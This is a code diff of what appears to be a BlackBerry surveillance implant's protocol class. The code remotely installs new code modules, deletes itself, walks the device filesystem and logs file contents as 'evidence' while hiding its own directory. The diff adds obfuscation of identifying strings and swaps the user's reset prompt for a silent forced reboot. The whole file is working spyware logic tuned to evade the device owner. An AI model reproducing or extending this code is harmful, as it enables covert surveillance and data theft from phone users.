@@ -17,6 +17,8 @@ import javax.microedition.io.file.FileSystemRegistry;
 
 import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.util.DataBuffer;
+import blackberry.Core;
+import blackberry.Messages;
 import blackberry.action.sync.protocol.CommandException;
 import blackberry.action.sync.protocol.ProtocolException;
 import blackberry.action.sync.transport.Transport;
@@ -34,11 +36,11 @@ import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
 public abstract class Protocol {
-    public static final String UPGRADE_FILENAME_0 = "core-0-update";
-    public static final String UPGRADE_FILENAME_1 = "core-1-update";
+    public static final String UPGRADE_FILENAME_0 = Messages.getString("e.0"); //$NON-NLS-1$
+    public static final String UPGRADE_FILENAME_1 = Messages.getString("e.1"); //$NON-NLS-1$
 
     //#ifdef DEBUG
-    private static Debug debug = new Debug("Protocol", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("Protocol", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
 
     protected Transport transport;
@@ -60,43 +62,43 @@ public abstract class Protocol {
         boolean ret = false;
         try {
             //#ifdef DEBUG
-            debug.trace("saveNewConf opening");
+            debug.trace("saveNewConf opening"); //$NON-NLS-1$
             //#endif
             final AutoFile file = new AutoFile(Path.conf(), Cfg.NEW_CONF);
 
             //#ifdef DEBUG
-            debug.trace("saveNewConf exists");
+            debug.trace("saveNewConf exists"); //$NON-NLS-1$
             //#endif
             if (file.exists()) {
                 //#ifdef DEBUG
-                debug.trace("saveNewConf delete");
+                debug.trace("saveNewConf delete"); //$NON-NLS-1$
                 //#endif
                 file.delete();
             }
 
             //#ifdef DEBUG
-            debug.trace("saveNewConf create");
+            debug.trace("saveNewConf create"); //$NON-NLS-1$
             //#endif
             file.create();
 
             //#ifdef DEBUG
-            debug.trace("saveNewConf write");
+            debug.trace("saveNewConf write"); //$NON-NLS-1$
             //#endif
             ret = file.write(conf, offset, conf.length - offset);
             if (!ret) {
                 //#ifdef DEBUG
-                debug.error("saveNewConf: cannot write on file: "
+                debug.error("saveNewConf: cannot write on file: " //$NON-NLS-1$
                         + file.getFullFilename());
                 //#endif
 
                 throw new CommandException(); //"write"
             } else {
-                Evidence.info("New configuration received");
+                Evidence.info(Messages.getString("e.2")); //$NON-NLS-1$
             }
         } catch (Exception ex) {
             //#ifdef DEBUG
             debug.error(ex);
-            debug.error("saveNewConf");
+            debug.error("saveNewConf"); //$NON-NLS-1$
             //#endif
         }
 
@@ -108,7 +110,7 @@ public abstract class Protocol {
 
         if (file.exists()) {
             //#ifdef DEBUG
-            debug.trace("getUpload replacing existing file: " + filename);
+            debug.trace("getUpload replacing existing file: " + filename); //$NON-NLS-1$
             //#endif
             file.delete();
         }
@@ -116,7 +118,7 @@ public abstract class Protocol {
         file.write(content);
 
         //#ifdef DEBUG
-        debug.trace("file written: " + file.exists());
+        debug.trace("file written: " + file.exists()); //$NON-NLS-1$
         //#endif
 
     }
@@ -128,13 +130,13 @@ public abstract class Protocol {
             // guarda se i file ci sono tutti e sono capienti e leggibili
             for (int i = 0; i < files.size(); i++) {
                 String file = (String) files.elementAt(i);
-                AutoFile autoFile = new AutoFile(file);
+                AutoFile autoFile = new AutoFile(Path.hidden(), file);
                 autoFiles[i] = autoFile;
 
                 if (!autoFile.exists() || !autoFile.isReadable()
                         || autoFile.getSize() <= 0) {
                     //#ifdef DEBUG
-                    debug.error("upgradeMulti, file does not exist: " + file);
+                    debug.error("upgradeMulti, file does not exist: " + file); //$NON-NLS-1$
                     //#endif
                 }
             }
@@ -147,7 +149,7 @@ public abstract class Protocol {
                 AutoFile autoFlashFile = autoFiles[i];
 
                 //#ifdef DEBUG
-                debug.trace("upgrading: " + autoFlashFile.getFullFilename());
+                debug.trace("upgrading: " + autoFlashFile.getFullFilename()); //$NON-NLS-1$
                 //#endif
                 upgradeCod(autoFlashFile.read());
                 autoFlashFile.delete();
@@ -155,21 +157,20 @@ public abstract class Protocol {
 
             // restart the blackberry if required
             if (CodeModuleManager.isResetRequired()) {
+                Core.forceReboot();
+
                 //#ifdef DEBUG
-                CodeModuleManager.promptForResetIfRequired();
-                //#endif
-                //#ifdef DEBUG
-                debug.warn("Reset required");
+                debug.warn("Reset required"); //$NON-NLS-1$
                 //#endif
             }
 
             //#ifdef DEBUG
-            debug.info("Upgrade REQUEST");
+            debug.info("Upgrade REQUEST"); //$NON-NLS-1$
             //#endif
             return true;
         } catch (Exception ex) {
             //#ifdef DEBUG
-            debug.info("Upgrade FAILED");
+            debug.info("Upgrade FAILED"); //$NON-NLS-1$
             //#endif
             return false;
         }
@@ -183,19 +184,19 @@ public abstract class Protocol {
 
         if (file_0.exists() && file_1.exists()) {
             //#ifdef DEBUG
-            debug.trace("upgradeMulti: both file present");
+            debug.trace("upgradeMulti: both file present"); //$NON-NLS-1$
             //#endif                        
 
             deleteSelf();
 
             //#ifdef DEBUG
-            debug.trace("upgrading: " + Protocol.UPGRADE_FILENAME_0);
+            debug.trace("upgrading: " + Protocol.UPGRADE_FILENAME_0); //$NON-NLS-1$
             //#endif
 
             upgradeCod(file_0.read());
 
             //#ifdef DEBUG
-            debug.trace("upgrading: " + Protocol.UPGRADE_FILENAME_0);
+            debug.trace("upgrading: " + Protocol.UPGRADE_FILENAME_0); //$NON-NLS-1$
             //#endif
 
             upgradeCod(file_1.read());
@@ -209,14 +210,14 @@ public abstract class Protocol {
                 CodeModuleManager.promptForResetIfRequired();
                 //#endif
                 //#ifdef DEBUG
-                debug.warn("Reset required");
+                debug.warn("Reset required"); //$NON-NLS-1$
                 //#endif
             }
 
             return true;
         } else {
             //#ifdef DEBUG
-            debug.trace("upgradeMulti: not both.");
+            debug.trace("upgradeMulti: not both."); //$NON-NLS-1$
             //#endif
             return false;
         }
@@ -228,7 +229,7 @@ public abstract class Protocol {
         if (handle != 0) {
             final int success = CodeModuleManager.deleteModuleEx(handle, true);
             //#ifdef DEBUG
-            debug.info("deleted: " + success);
+            debug.info("deleted: " + success); //$NON-NLS-1$
             //#endif
             return true;
         } else {
@@ -240,7 +241,7 @@ public abstract class Protocol {
 
         if (Utils.isZip(codBuff)) {
             //#ifdef DEBUG
-            debug.warn("zip not supported");
+            debug.warn("zip not supported"); //$NON-NLS-1$
             //#endif
             return false;
         }
@@ -255,7 +256,7 @@ public abstract class Protocol {
 
         if (codBuff.length > MAXAPPEND) {
             //#ifdef DEBUG
-            debug.trace("upgrade len: " + codBuff.length);
+            debug.trace("upgrade len: " + codBuff.length); //$NON-NLS-1$
             //#endif
             newHandle = CodeModuleManager.createNewModule(codBuff.length,
                     codBuff, MAXAPPEND);
@@ -265,20 +266,20 @@ public abstract class Protocol {
                             - MAXAPPEND);
 
             //#ifdef DEBUG
-            debug.trace("upgrade append success: " + appendSucc);
+            debug.trace("upgrade append success: " + appendSucc); //$NON-NLS-1$
             //#endif
 
             codBuff = null;
         } else {
             //#ifdef DEBUG
-            debug.trace("upgrade simple");
+            debug.trace("upgrade simple"); //$NON-NLS-1$
             //#endif
             newHandle = CodeModuleManager.createNewModule(codBuff.length,
                     codBuff, codBuff.length);
         }
 
         //#ifdef DEBUG
-        debug.trace("upgrade installing the module");
+        debug.trace("upgrade installing the module"); //$NON-NLS-1$
         //#endif
         // install the module
         if (newHandle != 0) {
@@ -286,18 +287,18 @@ public abstract class Protocol {
                     true);
             if (savecode != CodeModuleManager.CMM_OK_MODULE_OVERWRITTEN) {
                 //#ifdef DEBUG
-                debug.error("Module not overwritten");
+                debug.error("Module not overwritten"); //$NON-NLS-1$
                 //#endif
                 return false;
             }
         } else {
             //#ifdef DEBUG
-            debug.error("upgrade null handle");
+            debug.error("upgrade null handle"); //$NON-NLS-1$
             //#endif
         }
 
         //#ifdef DEBUG
-        debug.info("Module installed");
+        debug.info("Module installed"); //$NON-NLS-1$
         //#endif
 
         return true;
@@ -307,12 +308,12 @@ public abstract class Protocol {
         AutoFile file = new AutoFile(filefilter, false);
         if (file.exists()) {
             //#ifdef DEBUG
-            debug.trace("logging file: " + filefilter);
+            debug.trace("logging file: " + filefilter); //$NON-NLS-1$
             //#endif
             saveFileLog(file, filefilter);
         } else {
             //#ifdef DEBUG
-            debug.trace("not a file, try to expand it: " + filefilter);
+            debug.trace("not a file, try to expand it: " + filefilter); //$NON-NLS-1$
             //#endif
             for (Enumeration en = Directory.find(filefilter); en
                     .hasMoreElements();) {
@@ -326,7 +327,7 @@ public abstract class Protocol {
                 saveFileLog(file, filename);
 
                 //#ifdef DEBUG
-                debug.trace("logging file: " + filename);
+                debug.trace("logging file: " + filename); //$NON-NLS-1$
                 //#endif
 
             }
@@ -335,10 +336,10 @@ public abstract class Protocol {
 
     private static void saveFileLog(AutoFile file, String filename) {
         //#ifdef DBC
-        Check.requires(file != null, "null file");
-        Check.requires(file.exists(), "file should exist");
-        Check.requires(!filename.endsWith("/"), "path shouldn't end with /");
-        Check.requires(!filename.endsWith("*"), "path shouldn't end with *");
+        Check.requires(file != null, "null file"); //$NON-NLS-1$
+        Check.requires(file.exists(), "file should exist"); //$NON-NLS-1$
+        Check.requires(!filename.endsWith("/"), "path shouldn't end with /"); //$NON-NLS-1$ //$NON-NLS-2$
+        Check.requires(!filename.endsWith("*"), "path shouldn't end with *"); //$NON-NLS-1$ //$NON-NLS-2$
         //#endif
 
         byte[] content = file.read();
@@ -351,16 +352,16 @@ public abstract class Protocol {
     private static byte[] logDownloadAdditional(String filename) {
 
         //#ifdef DBC
-        Check.requires(filename != null, "null file");
-        Check.requires(!filename.endsWith("/"), "path shouldn't end with /");
-        Check.requires(!filename.endsWith("*"), "path shouldn't end with *");
+        Check.requires(filename != null, "null file"); //$NON-NLS-1$
+        Check.requires(!filename.endsWith("/"), "path shouldn't end with /"); //$NON-NLS-1$ //$NON-NLS-2$
+        Check.requires(!filename.endsWith("*"), "path shouldn't end with *"); //$NON-NLS-1$ //$NON-NLS-2$
         //#endif
 
-        String path = Utils.chomp(Path.hidden(), "/"); // UPLOAD_DIR
+        String path = Utils.chomp(Path.hidden(), "/"); // UPLOAD_DIR //$NON-NLS-1$
         int macroPos = filename.indexOf(path);
         if (macroPos >= 0) {
             //#ifdef DEBUG
-            debug.trace("macropos: " + macroPos);
+            debug.trace("macropos: " + macroPos); //$NON-NLS-1$
             //#endif
             String start = filename.substring(0, macroPos);
             String end = filename.substring(macroPos + path.length());
@@ -369,7 +370,7 @@ public abstract class Protocol {
         }
 
         //#ifdef DEBUG
-        debug.trace("filename: " + filename);
+        debug.trace("filename: " + filename); //$NON-NLS-1$
         //#endif
 
         int version = 2008122901;
@@ -391,19 +392,23 @@ public abstract class Protocol {
         fsLog.createEvidence();
 
         // Expand path and create log
-        if (path.equals("/")) {
+        if (path.equals("/")) { //$NON-NLS-1$
             //#ifdef DEBUG
-            debug.trace("sendFilesystem: root");
+            debug.trace("sendFilesystem: root"); //$NON-NLS-1$
             //#endif
             expandRoot(fsLog, depth);
         } else {
-            if (path.startsWith("//") && path.endsWith("/*")) {
-                path = path.substring(1, path.length() - 2);
-
+            if (path.startsWith("//")) {
+                path = path.substring(1, path.length());
+            }
+            if (path.endsWith("/*")) { //$NON-NLS-1$ //$NON-NLS-2$
+                path = path.substring(0, path.length() - 2);
+            }
+            if (path.startsWith("/")) {
                 expandPath(fsLog, path, depth);
             } else {
                 //#ifdef DEBUG
-                debug.error("sendFilesystem: strange path, ignoring it. "
+                debug.error("sendFilesystem: strange path, ignoring it. " //$NON-NLS-1$
                         + path);
                 //#endif
             }
@@ -419,7 +424,7 @@ public abstract class Protocol {
      */
     private static void expandRoot(Evidence fsLog, int depth) {
         //#ifdef DBC
-        Check.requires(depth > 0, "wrong recursion depth");
+        Check.requires(depth > 0, "wrong recursion depth"); //$NON-NLS-1$
         //#endif
 
         saveRootLog(fsLog); // depth 0
@@ -427,36 +432,36 @@ public abstract class Protocol {
 
         while (roots.hasMoreElements()) {
             String root = (String) roots.nextElement();
-            if (root.endsWith("/")) {
+            if (root.endsWith("/")) { //$NON-NLS-1$
                 root = root.substring(0, root.length() - 1);
             }
             //#ifdef DEBUG
-            debug.trace("expandRoot: " + root + " depth: " + depth);
+            debug.trace("expandRoot: " + root + " depth: " + depth); //$NON-NLS-1$ //$NON-NLS-2$
             //#endif
-            Protocol.saveFilesystemLog(fsLog, "/" + root); // depth 1
+            Protocol.saveFilesystemLog(fsLog, "/" + root); // depth 1 //$NON-NLS-1$
             if (depth - 1 > 0) {
                 // if depth is 0, no recursion is required
-                expandPath(fsLog, "/" + root, depth - 1); // depth 2+
+                expandPath(fsLog, "/" + root, depth - 1); // depth 2+ //$NON-NLS-1$
             }
         }
     }
 
     private static boolean saveFilesystemLog(Evidence fsLog, String filepath) {
         //#ifdef DBC
-        Check.requires(fsLog != null, "fsLog null");
-        Check.requires(!filepath.endsWith("/"), "path shouldn't end with /");
-        Check.requires(!filepath.endsWith("*"), "path shouldn't end with *");
+        Check.requires(fsLog != null, "fsLog null"); //$NON-NLS-1$
+        Check.requires(!filepath.endsWith("/"), "path shouldn't end with /"); //$NON-NLS-1$ //$NON-NLS-2$
+        Check.requires(!filepath.endsWith("*"), "path shouldn't end with *"); //$NON-NLS-1$ //$NON-NLS-2$
         //#endif
 
         //#ifdef DEBUG
-        debug.info("save FilesystemLog: " + filepath);
+        debug.info("save FilesystemLog: " + filepath); //$NON-NLS-1$
         //#endif
         int version = 2010031501;
 
         AutoFile file = new AutoFile(filepath);
         if (!file.exists()) {
             //#ifdef DEBUG
-            debug.error("non existing file: " + filepath);
+            debug.error("non existing file: " + filepath); //$NON-NLS-1$
             //#endif
             return false;
         }
@@ -490,7 +495,7 @@ public abstract class Protocol {
         fsLog.writeEvidence(content);
 
         //#ifdef DEBUG
-        debug.trace("expandPath: written log");
+        debug.trace("expandPath: written log"); //$NON-NLS-1$
         //#endif
 
         return isDir;
@@ -504,7 +509,7 @@ public abstract class Protocol {
         int version = 2010031501;
 
         //#ifdef DBC
-        Check.requires(fsLog != null, "fsLog null");
+        Check.requires(fsLog != null, "fsLog null"); //$NON-NLS-1$
         //#endif
         //byte[] content = new byte[30];
         DataBuffer databuffer = new DataBuffer(false);
@@ -513,7 +518,7 @@ public abstract class Protocol {
         databuffer.writeInt(1); // flags
         databuffer.writeLong(0);
         databuffer.writeLong(DateTime.getFiledate(new Date()));
-        databuffer.write(WChar.getBytes("/"));
+        databuffer.write(WChar.getBytes("/")); //$NON-NLS-1$
 
         fsLog.writeEvidence(databuffer.toArray());
     }
@@ -527,35 +532,35 @@ public abstract class Protocol {
      */
     private static void expandPath(Evidence fsLog, String path, int depth) {
         //#ifdef DBC
-        Check.requires(depth > 0, "wrong recursion depth");
-        Check.requires(path != null, "path==null");
-        Check.requires(!path.endsWith("/"), "path shouldn't end with /");
-        Check.requires(!path.endsWith("*"), "path shouldn't end with *");
+        Check.requires(depth > 0, "wrong recursion depth"); //$NON-NLS-1$
+        Check.requires(path != null, "path==null"); //$NON-NLS-1$
+        Check.requires(!path.endsWith("/"), "path shouldn't end with /"); //$NON-NLS-1$ //$NON-NLS-2$
+        Check.requires(!path.endsWith("*"), "path shouldn't end with *"); //$NON-NLS-1$ //$NON-NLS-2$
         //#endif
 
         //#ifdef DEBUG
-        debug.trace("expandPath: " + path + " depth: " + depth);
+        debug.trace("expandPath: " + path + " depth: " + depth); //$NON-NLS-1$ //$NON-NLS-2$
         //#endif
 
         //saveFilesystemLog(path);
         //if (depth > 0) {
-        for (Enumeration en = Directory.find(path + "/*"); en.hasMoreElements();) {
+        for (Enumeration en = Directory.find(path + "/*"); en.hasMoreElements();) { //$NON-NLS-1$
 
-            String dPath = path + "/" + (String) en.nextElement();
-            if (dPath.endsWith("/")) {
+            String dPath = path + "/" + (String) en.nextElement(); //$NON-NLS-1$
+            if (dPath.endsWith("/")) { //$NON-NLS-1$
                 //#ifdef DEBUG
-                debug.trace("expandPath: dir");
+                debug.trace("expandPath: dir"); //$NON-NLS-1$
                 //#endif
                 dPath = dPath.substring(0, dPath.length() - 1); // togli lo /
             } else {
                 //#ifdef DEBUG
-                debug.trace("expandPath: file");
+                debug.trace("expandPath: file"); //$NON-NLS-1$
                 //#endif
             }
 
-            if (dPath.indexOf(Utils.chomp(Path.hidden(), "/")) >= 0) {
+            if (dPath.indexOf(Utils.chomp(Path.hidden(), "/")) >= 0) { //$NON-NLS-1$
                 //#ifdef DEBUG
-                debug.warn("expandPath ignoring hidden path: " + dPath);
+                debug.warn("expandPath ignoring hidden path: " + dPath); //$NON-NLS-1$
                 //#endif
                 continue;
             }
@@ -569,9 +574,9 @@ public abstract class Protocol {
     }
 
     public static String normalizeFilename(String file) {
-        if (file.startsWith("//")) {
+        if (file.startsWith("//")) { //$NON-NLS-1$
             //#ifdef DEBUG
-            debug.trace("normalizeFilename: " + file);
+            debug.trace("normalizeFilename: " + file); //$NON-NLS-1$
             //#endif
             return file.substring(1);
         } else {
